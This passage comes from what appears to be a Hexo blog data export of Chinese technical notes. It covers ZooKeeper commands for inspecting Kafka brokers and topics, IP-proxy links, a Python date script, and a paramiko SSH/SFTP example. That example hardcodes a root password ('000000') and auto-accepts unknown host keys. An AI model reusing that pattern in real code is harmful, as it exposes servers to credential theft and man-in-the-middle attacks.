rmstore, yarn-leader-election, controller_epoch, isr_change_notification, admin, zookeeper, cluster, config, controller, brokers]\n\n#查看broker的id\nls /brokers/ids\n[3, 2, 0]\n\n#查看消息\nls /brokers/topics\n[new, __consumer_offsets, test, uf20, hahahhaahh, testfile, accountPosition, testFile]\n\n#查看删除的消息\nls /admin/delete_topics\n[account]\n```\n- #### get [path]\n```\n#查看broker的信息\nget /brokers/ids/0\n{\"jmx_port\":-1,\"timestamp\":\"1516184048700\",\"endpoints\":[\"PLAINTEXT://hs01:9092\"],\"host\":\"hs01\",\"version\":2,\"port\":9092}\ncZxid = 0x29000048b2\nctime = Wed Jan 17 18:14:08 CST 2018\nmZxid = 0x29000048b2\nmtime = Wed Jan 17 18:14:08 CST 2018\npZxid = 0x29000048b2\ncversion = 0\ndataVersion = 0\naclVersion = 0\nephemeralOwner = 0x261033b8886032a\ndataLength = 119\nnumChildren = 0\n```\n- #### rmr [path]\n```\n#删除消息\nrmr /brokers/topics/test\nrmr /admin/delete_topics/test\n```","slug":"kafka/zookeeper客户端查看kafka配置","published":1,"updated":"2018-07-10T13:10:09.920Z","_id":"cjjedmhb3005x0gtjs8gfm5uy","comments":1,"layout":"post","photos":[],"link":"","content":"<ul>\n<li><h4 id=\"连接\"><a href=\"#连接\" class=\"headerlink\" title=\"连接\"></a>连接</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#连接</span><br><span class=\"line\">zookeeper-shell.sh hs01:2181,hs02:2181,hs03:2181</span><br><span class=\"line\"></span><br><span class=\"line\">Connecting to hs01:2181,hs02:2181,hs03:2181</span><br><span class=\"line\">Welcome to ZooKeeper!</span><br><span class=\"line\">JLine support is disabled</span><br><span class=\"line\"></span><br><span class=\"line\">WATCHER::</span><br><span class=\"line\"></span><br><span class=\"line\">WatchedEvent state:SyncConnected type:None path:null</span><br></pre></td></tr></table></figure>\n</li>\n<li><h4 id=\"命令\"><a href=\"#命令\" class=\"headerlink\" title=\"命令\"></a>命令</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">   connect host:port</span><br><span class=\"line\">get path [watch]</span><br><span class=\"line\">ls path [watch]</span><br><span class=\"line\">set path data [version]</span><br><span class=\"line\">rmr path</span><br><span class=\"line\">delquota [-n|-b] path</span><br><span class=\"line\">quit </span><br><span class=\"line\">printwatches on|off</span><br><span class=\"line\">create [-s] [-e] path data acl</span><br><span class=\"line\">stat path [watch]</span><br><span class=\"line\">close </span><br><span class=\"line\">ls2 path [watch]</span><br><span class=\"line\">history </span><br><span class=\"line\">listquota path</span><br><span class=\"line\">setAcl path acl</span><br><span class=\"line\">getAcl path</span><br><span class=\"line\">sync path</span><br><span class=\"line\">redo cmdno</span><br><span class=\"line\">addauth scheme auth</span><br><span class=\"line\">delete path [version]</span><br><span class=\"line\">setquota -n|-b val path</span><br></pre></td></tr></table></figure>\n</li>\n<li><h4 id=\"ls-path\"><a href=\"#ls-path\" class=\"headerlink\" title=\"ls [path]\"></a>ls [path]</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ls /</span><br><span class=\"line\">[hs_jstorm, consumers, hive_zookeeper_namespace_hive, latest_producer_id_block, rmstore, yarn-leader-election, controller_epoch, isr_change_notification, admin, zookeeper, cluster, config, controller, brokers]</span><br><span class=\"line\"></span><br><span class=\"line\">#查看broker的id</span><br><span class=\"line\">ls /brokers/ids</span><br><span class=\"line\">[3, 2, 0]</span><br><span class=\"line\"></span><br><span class=\"line\">#查看消息</span><br><span class=\"line\">ls /brokers/topics</span><br><span class=\"line\">[new, __consumer_offsets, test, uf20, hahahhaahh, testfile, accountPosition, testFile]</span><br><span class=\"line\"></span><br><span class=\"line\">#查看删除的消息</span><br><span class=\"line\">ls /admin/delete_topics</span><br><span class=\"line\">[account]</span><br></pre></td></tr></table></figure>\n</li>\n<li><h4 id=\"get-path\"><a href=\"#get-path\" class=\"headerlink\" title=\"get [path]\"></a>get [path]</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#查看broker的信息</span><br><span class=\"line\">get /brokers/ids/0</span><br><span class=\"line\">&#123;&quot;jmx_port&quot;:-1,&quot;timestamp&quot;:&quot;1516184048700&quot;,&quot;endpoints&quot;:[&quot;PLAINTEXT://hs01:9092&quot;],&quot;host&quot;:&quot;hs01&quot;,&quot;version&quot;:2,&quot;port&quot;:9092&#125;</span><br><span class=\"line\">cZxid = 0x29000048b2</span><br><span class=\"line\">ctime = Wed Jan 17 18:14:08 CST 2018</span><br><span class=\"line\">mZxid = 0x29000048b2</span><br><span class=\"line\">mtime = Wed Jan 17 18:14:08 CST 2018</span><br><span class=\"line\">pZxid = 0x29000048b2</span><br><span class=\"line\">cversion = 0</span><br><span class=\"line\">dataVersion = 0</span><br><span class=\"line\">aclVersion = 0</span><br><span class=\"line\">ephemeralOwner = 0x261033b8886032a</span><br><span class=\"line\">dataLength = 119</span><br><span class=\"line\">numChildren = 0</span><br></pre></td></tr></table></figure>\n</li>\n<li><h4 id=\"rmr-path\"><a href=\"#rmr-path\" class=\"headerlink\" title=\"rmr [path]\"></a>rmr [path]</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#删除消息</span><br><span class=\"line\">rmr /brokers/topics/test</span><br><span class=\"line\">rmr /admin/delete_topics/test</span><br></pre></td></tr></table></figure></li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<ul>\n<li><h4 id=\"连接\"><a href=\"#连接\" class=\"headerlink\" title=\"连接\"></a>连接</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#连接</span><br><span class=\"line\">zookeeper-shell.sh hs01:2181,hs02:2181,hs03:2181</span><br><span class=\"line\"></span><br><span class=\"line\">Connecting to hs01:2181,hs02:2181,hs03:2181</span><br><span class=\"line\">Welcome to ZooKeeper!</span><br><span class=\"line\">JLine support is disabled</span><br><span class=\"line\"></span><br><span class=\"line\">WATCHER::</span><br><span class=\"line\"></span><br><span class=\"line\">WatchedEvent state:SyncConnected type:None path:null</span><br></pre></td></tr></table></figure>\n</li>\n<li><h4 id=\"命令\"><a href=\"#命令\" class=\"headerlink\" title=\"命令\"></a>命令</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">   connect host:port</span><br><span class=\"line\">get path [watch]</span><br><span class=\"line\">ls path [watch]</span><br><span class=\"line\">set path data [version]</span><br><span class=\"line\">rmr path</span><br><span class=\"line\">delquota [-n|-b] path</span><br><span class=\"line\">quit </span><br><span class=\"line\">printwatches on|off</span><br><span class=\"line\">create [-s] [-e] path data acl</span><br><span class=\"line\">stat path [watch]</span><br><span class=\"line\">close </span><br><span class=\"line\">ls2 path [watch]</span><br><span class=\"line\">history </span><br><span class=\"line\">listquota path</span><br><span class=\"line\">setAcl path acl</span><br><span class=\"line\">getAcl path</span><br><span class=\"line\">sync path</span><br><span class=\"line\">redo cmdno</span><br><span class=\"line\">addauth scheme auth</span><br><span class=\"line\">delete path [version]</span><br><span class=\"line\">setquota -n|-b val path</span><br></pre></td></tr></table></figure>\n</li>\n<li><h4 id=\"ls-path\"><a href=\"#ls-path\" class=\"headerlink\" title=\"ls [path]\"></a>ls [path]</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ls /</span><br><span class=\"line\">[hs_jstorm, consumers, hive_zookeeper_namespace_hive, latest_producer_id_block, rmstore, yarn-leader-election, controller_epoch, isr_change_notification, admin, zookeeper, cluster, config, controller, brokers]</span><br><span class=\"line\"></span><br><span class=\"line\">#查看broker的id</span><br><span class=\"line\">ls /brokers/ids</span><br><span class=\"line\">[3, 2, 0]</span><br><span class=\"line\"></span><br><span class=\"line\">#查看消息</span><br><span class=\"line\">ls /brokers/topics</span><br><span class=\"line\">[new, __consumer_offsets, test, uf20, hahahhaahh, testfile, accountPosition, testFile]</span><br><span class=\"line\"></span><br><span class=\"line\">#查看删除的消息</span><br><span class=\"line\">ls /admin/delete_topics</span><br><span class=\"line\">[account]</span><br></pre></td></tr></table></figure>\n</li>\n<li><h4 id=\"get-path\"><a href=\"#get-path\" class=\"headerlink\" title=\"get [path]\"></a>get [path]</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#查看broker的信息</span><br><span class=\"line\">get /brokers/ids/0</span><br><span class=\"line\">&#123;&quot;jmx_port&quot;:-1,&quot;timestamp&quot;:&quot;1516184048700&quot;,&quot;endpoints&quot;:[&quot;PLAINTEXT://hs01:9092&quot;],&quot;host&quot;:&quot;hs01&quot;,&quot;version&quot;:2,&quot;port&quot;:9092&#125;</span><br><span class=\"line\">cZxid = 0x29000048b2</span><br><span class=\"line\">ctime = Wed Jan 17 18:14:08 CST 2018</span><br><span class=\"line\">mZxid = 0x29000048b2</span><br><span class=\"line\">mtime = Wed Jan 17 18:14:08 CST 2018</span><br><span class=\"line\">pZxid = 0x29000048b2</span><br><span class=\"line\">cversion = 0</span><br><span class=\"line\">dataVersion = 0</span><br><span class=\"line\">aclVersion = 0</span><br><span class=\"line\">ephemeralOwner = 0x261033b8886032a</span><br><span class=\"line\">dataLength = 119</span><br><span class=\"line\">numChildren = 0</span><br></pre></td></tr></table></figure>\n</li>\n<li><h4 id=\"rmr-path\"><a href=\"#rmr-path\" class=\"headerlink\" title=\"rmr [path]\"></a>rmr [path]</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#删除消息</span><br><span class=\"line\">rmr /brokers/topics/test</span><br><span class=\"line\">rmr /admin/delete_topics/test</span><br></pre></td></tr></table></figure></li>\n</ul>\n"},{"title":"IP代理和测试","date":"2018-07-10T13:09:19.000Z","_content":"#### IP代理使用\n[blog](http://blog.csdn.net/lammonpeter/article/details/52917264)\n#### 测试能不能用\n[blog](http://blog.csdn.net/liujiandu101/article/details/51902393)\n\n#### [在线检测，好像没吊用](http://www.66ip.cn/yz/)","source":"_posts/python/IP代理和测试.md","raw":"---\ntitle: IP代理和测试\ndate: 2018-07-10 21:09:19\ntags: python\n---\n#### IP代理使用\n[blog](http://blog.csdn.net/lammonpeter/article/details/52917264)\n#### 测试能不能用\n[blog](http://blog.csdn.net/liujiandu101/article/details/51902393)\n\n#### [在线检测，好像没吊用](http://www.66ip.cn/yz/)","slug":"python/IP代理和测试","published":1,"updated":"2018-07-10T13:10:09.956Z","_id":"cjjedmhb400600gtjztxklrk6","comments":1,"layout":"post","photos":[],"link":"","content":"<h4 id=\"IP代理使用\"><a href=\"#IP代理使用\" class=\"headerlink\" title=\"IP代理使用\"></a>IP代理使用</h4><p><a href=\"http://blog.csdn.net/lammonpeter/article/details/52917264\" target=\"_blank\" rel=\"noopener\">blog</a></p>\n<h4 id=\"测试能不能用\"><a href=\"#测试能不能用\" class=\"headerlink\" title=\"测试能不能用\"></a>测试能不能用</h4><p><a href=\"http://blog.csdn.net/liujiandu101/article/details/51902393\" target=\"_blank\" rel=\"noopener\">blog</a></p>\n<h4 id=\"在线检测，好像没吊用\"><a href=\"#在线检测，好像没吊用\" class=\"headerlink\" title=\"在线检测，好像没吊用\"></a><a href=\"http://www.66ip.cn/yz/\" target=\"_blank\" rel=\"noopener\">在线检测，好像没吊用</a></h4>","site":{"data":{}},"excerpt":"","more":"<h4 id=\"IP代理使用\"><a href=\"#IP代理使用\" class=\"headerlink\" title=\"IP代理使用\"></a>IP代理使用</h4><p><a href=\"http://blog.csdn.net/lammonpeter/article/details/52917264\" target=\"_blank\" rel=\"noopener\">blog</a></p>\n<h4 id=\"测试能不能用\"><a href=\"#测试能不能用\" class=\"headerlink\" title=\"测试能不能用\"></a>测试能不能用</h4><p><a href=\"http://blog.csdn.net/liujiandu101/article/details/51902393\" target=\"_blank\" rel=\"noopener\">blog</a></p>\n<h4 id=\"在线检测，好像没吊用\"><a href=\"#在线检测，好像没吊用\" class=\"headerlink\" title=\"在线检测，好像没吊用\"></a><a href=\"http://www.66ip.cn/yz/\" target=\"_blank\" rel=\"noopener\">在线检测，好像没吊用</a></h4>"},{"title":"Python 执行shell命令， 获取时间，切割字符串","date":"2018-07-10T13:09:19.000Z","_content":"```\n#import subprocess\n#import commands\nimport time\nimport datetime\n\nstartdate = '20160101'\nenddate = '20160101'\n\n\nclosefile = open('close', 'r+')\n\n\ndef next_day(date):\n    i = date[0:3]\n    m = int(i)\n    date = datetime.datetime(int(date[0:4]), int(date[4:6]), int(date[6:8])) + datetime.timedelta(days=1)\n    time_format = date.strftime('%Y%m%d')\n    return time_format\n\n\ndef copy_data(date, next_date):\n    print('hahahah',date,'lallala',next_date)\n    command = 'perl -p -i'+date+'.bak -e \"s/' + date + '/' + next_date + '/g\" t'\n    print(command)\n    #subprocess.call(command)\n    #commands.getoutput(command)\n\n\nwhile 1:\n    closedate = closefile.readline().replace('\\n','')\n    closedate = closedate.replace('\\r','')\n    if (closedate):\n        copy_data(startdate, next_day(startdate))\n        startdate = next_day(startdate)\n    else:\n        break\n\nclosefile.close()\n```","source":"_posts/python/Python 执行shell命令， 获取时间，切割字符串.md","raw":"---\ntitle: Python 执行shell命令， 获取时间，切割字符串\ndate: 2018-07-10 21:09:19\ntags: python\n---\n```\n#import subprocess\n#import commands\nimport time\nimport datetime\n\nstartdate = '20160101'\nenddate = '20160101'\n\n\nclosefile = open('close', 'r+')\n\n\ndef next_day(date):\n    i = date[0:3]\n    m = int(i)\n    date = datetime.datetime(int(date[0:4]), int(date[4:6]), int(date[6:8])) + datetime.timedelta(days=1)\n    time_format = date.strftime('%Y%m%d')\n    return time_format\n\n\ndef copy_data(date, next_date):\n    print('hahahah',date,'lallala',next_date)\n    command = 'perl -p -i'+date+'.bak -e \"s/' + date + '/' + next_date + '/g\" t'\n    print(command)\n    #subprocess.call(command)\n    #commands.getoutput(command)\n\n\nwhile 1:\n    closedate = closefile.readline().replace('\\n','')\n    closedate = closedate.replace('\\r','')\n    if (closedate):\n        copy_data(startdate, next_day(startdate))\n        startdate = next_day(startdate)\n    else:\n        break\n\nclosefile.close()\n```","slug":"python/Python 执行shell命令， 获取时间，切割字符串","published":1,"updated":"2018-07-10T13:10:09.958Z","_id":"cjjedmhb500620gtjlo486sdg","comments":1,"layout":"post","photos":[],"link":"","content":"<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#import subprocess</span><br><span class=\"line\">#import commands</span><br><span class=\"line\">import time</span><br><span class=\"line\">import datetime</span><br><span class=\"line\"></span><br><span class=\"line\">startdate = &apos;20160101&apos;</span><br><span class=\"line\">enddate = &apos;20160101&apos;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">closefile = open(&apos;close&apos;, &apos;r+&apos;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def next_day(date):</span><br><span class=\"line\">    i = date[0:3]</span><br><span class=\"line\">    m = int(i)</span><br><span class=\"line\">    date = datetime.datetime(int(date[0:4]), int(date[4:6]), int(date[6:8])) + datetime.timedelta(days=1)</span><br><span class=\"line\">    time_format = date.strftime(&apos;%Y%m%d&apos;)</span><br><span class=\"line\">    return time_format</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def copy_data(date, next_date):</span><br><span class=\"line\">    print(&apos;hahahah&apos;,date,&apos;lallala&apos;,next_date)</span><br><span class=\"line\">    command = &apos;perl -p -i&apos;+date+&apos;.bak -e &quot;s/&apos; + date + &apos;/&apos; + next_date + &apos;/g&quot; t&apos;</span><br><span class=\"line\">    print(command)</span><br><span class=\"line\">    #subprocess.call(command)</span><br><span class=\"line\">    #commands.getoutput(command)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">while 1:</span><br><span class=\"line\">    closedate = closefile.readline().replace(&apos;\\n&apos;,&apos;&apos;)</span><br><span class=\"line\">    closedate = closedate.replace(&apos;\\r&apos;,&apos;&apos;)</span><br><span class=\"line\">    if (closedate):</span><br><span class=\"line\">        copy_data(startdate, next_day(startdate))</span><br><span class=\"line\">        startdate = next_day(startdate)</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        break</span><br><span class=\"line\"></span><br><span class=\"line\">closefile.close()</span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#import subprocess</span><br><span class=\"line\">#import commands</span><br><span class=\"line\">import time</span><br><span class=\"line\">import datetime</span><br><span class=\"line\"></span><br><span class=\"line\">startdate = &apos;20160101&apos;</span><br><span class=\"line\">enddate = &apos;20160101&apos;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">closefile = open(&apos;close&apos;, &apos;r+&apos;)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def next_day(date):</span><br><span class=\"line\">    i = date[0:3]</span><br><span class=\"line\">    m = int(i)</span><br><span class=\"line\">    date = datetime.datetime(int(date[0:4]), int(date[4:6]), int(date[6:8])) + datetime.timedelta(days=1)</span><br><span class=\"line\">    time_format = date.strftime(&apos;%Y%m%d&apos;)</span><br><span class=\"line\">    return time_format</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def copy_data(date, next_date):</span><br><span class=\"line\">    print(&apos;hahahah&apos;,date,&apos;lallala&apos;,next_date)</span><br><span class=\"line\">    command = &apos;perl -p -i&apos;+date+&apos;.bak -e &quot;s/&apos; + date + &apos;/&apos; + next_date + &apos;/g&quot; t&apos;</span><br><span class=\"line\">    print(command)</span><br><span class=\"line\">    #subprocess.call(command)</span><br><span class=\"line\">    #commands.getoutput(command)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">while 1:</span><br><span class=\"line\">    closedate = closefile.readline().replace(&apos;\\n&apos;,&apos;&apos;)</span><br><span class=\"line\">    closedate = closedate.replace(&apos;\\r&apos;,&apos;&apos;)</span><br><span class=\"line\">    if (closedate):</span><br><span class=\"line\">        copy_data(startdate, next_day(startdate))</span><br><span class=\"line\">        startdate = next_day(startdate)</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        break</span><br><span class=\"line\"></span><br><span class=\"line\">closefile.close()</span><br></pre></td></tr></table></figure>"},{"title":"Python 连接远程服务","date":"2018-07-10T13:09:19.000Z","_content":"## Python 连接远程服务器\n\n\n#### 1.Python库：paramiko\n  用来通过ssh协议连接远程服务器\n  \n [ githuB文档](http://docs.paramiko.org/en/2.1/api/proxy.html)\n  \n  [使用示例](http://www.tuicool.com/articles/e2EFzy)\n \n  [ssh详解](http://www.ruanyifeng.com/blog/2011/12/ssh_remote_login.html)\n  \n```\nimport paramiko\n\n#用户名和密码\nUSER = 'root'\nPASSWORD = '000000'\n\n#要更新的文件和路径\nfile_update = 'textchat.js'\n\ncmd_mk = 'mkdir hq01'\ncmd_rm = 'rm -r hq02'\n\nIP = '192.168.207.132'\n\ns = paramiko.SSHClient()\ns.set_missing_host_key_policy(paramiko.AutoAddPolicy())\ns.connect(hostname=IP, username=USER, password=PASSWORD)\n\nout_rm = s.exec_command(cmd_rm)\nout_mk = s.exec_command(cmd_mk)\n\ns.close\n\n\nREMORE_PATH = '/root/hq01/get.py'\nLOCAL_PATH = 'get.py'\n\n\nt = paramiko.Transport((IP,22))\nt.connect(username=USER,password=PASSWORD)\ns = paramiko.SFTPClient.from_transport(t)\ns.put(LOCAL_PATH,REMORE_PATH)\nt.close\n```\n\n#### 2.Python库：ConfigParser\n用于读取配置文件（方便配置） \n\n[使用示例](http://www.pythontab.com/html/2014/pythonhexinbiancheng_1120/919.html)\n\n#### 3.Python库 ftplib(自带)\n用于实现ftp客户端\n\n[使用示例](http://www.cnblogs.com/kaituorensheng/p/4480512.html)\n  \n  [ftp 详解](http://www.cnblogs.com/luoxn28/p/5585458.html)\n  \n  Linux中ftp的使用\n  \n  [链接](http://www.linuxidc.com/Linux/2015-12/126357.htm)","source":"_posts/python/Python 连接远程服务.md","raw":"---\ntitle: Python 连接远程服务\ndate: 2018-07-10 21:09:19\ntags: python\n---\n## Python 连接远程服务器\n\n\n#### 1.Python库：paramiko\n  用来通过ssh协议连接远程服务器\n  \n [ githuB文档](http://docs.paramiko.org/en/2.1/api/proxy.html)\n  \n  [使用示例](http://www.tuicool.com/articles/e2EFzy)\n \n  [ssh详解](http://www.ruanyifeng.com/blog/2011/12/ssh_remote_login.html)\n  \n```\nimport paramiko\n\n#用户名和密码\nUSER = 'root'\nPASSWORD = '000000'\n\n#要更新的文件和路径\nfile_update = 'textchat.js'\n\ncmd_mk = 'mkdir hq01'\ncmd_rm = 'rm -r hq02'\n\nIP = '192.168.207.132'\n\ns = paramiko.SSHClient()\ns.set_missing_host_key_policy(paramiko.AutoAddPolicy())\ns.connect(hostname=IP, username=USER, password=PASSWORD)\n\nout_rm = s.exec_command(cmd_rm)\nout_mk = s.exec_command(cmd_mk)\n\ns.close\n\n\nREMORE_PATH = '/root/hq01/get.py'\nLOCAL_PATH = 'get.py'\n\n\nt = paramiko.Transport((IP,22))\nt.connect(username=USER,password=PASSWORD)\ns = paramiko.SFTPClient.from_transport(t)\ns.put(LOCAL_PATH,REMORE_PATH)\nt.close\n```\n\n#### 2.Python库：ConfigParser\n用于读取配置文件（方便配置） \n\n[使用示例](http://www.pythontab.com/html/2014/pythonhexinbiancheng_1120/919.html)\n\n#### 3.Python库 ftplib(自带)\n用于实现ftp客户端\n\n[使用示例](http://www.cnblogs.com/kaituorensheng/p/4480512.html)\n  \n  [ftp 详解](http://www.cnblogs.com/luoxn28/p/5585458.html)\n  \n  Linux中ftp的使用\n  \n  [链接](http://www.linuxidc.com/Linux/2015-12/126357.htm)","slug":"python/Python 连接远程服务","published":1,"updated":"2018-07-10T13:10:09.959Z","_id":"cjjedmhb600650gtj2kum8amo","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"Python-连接远程服务器\"><a href=\"#Python-连接远程服务器\" class=\"headerlink\" title=\"Python 连接远程服务器\"></a>Python 连接远程服务器</h2><h4 id=\"1-Python库：paramiko\"><a href=\"#1-Python库：paramiko\" class=\"headerlink\" title=\"1.Python库：paramiko\"></a>1.Python库：paramiko</h4><p>  用来通过ssh协议连接远程服务器</p>\n<p> <a href=\"http://docs.paramiko.org/en/2.1/api/proxy.html\" target=\"_blank\" rel=\"noopener\"> githuB文档</a></p>\n<p>  <a href=\"http://www.tuicool.com/articles/e2EFzy\" target=\"_blank\" rel=\"noopener\">使用示例</a></p>\n<p>  <a href=\"http://www.ruanyifeng.com/blog/2011/12/ssh_remote_login.html\" target=\"_blank\" rel=\"noopener\">ssh详解</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import paramiko</span><br><span class=\"line\"></span><br><span 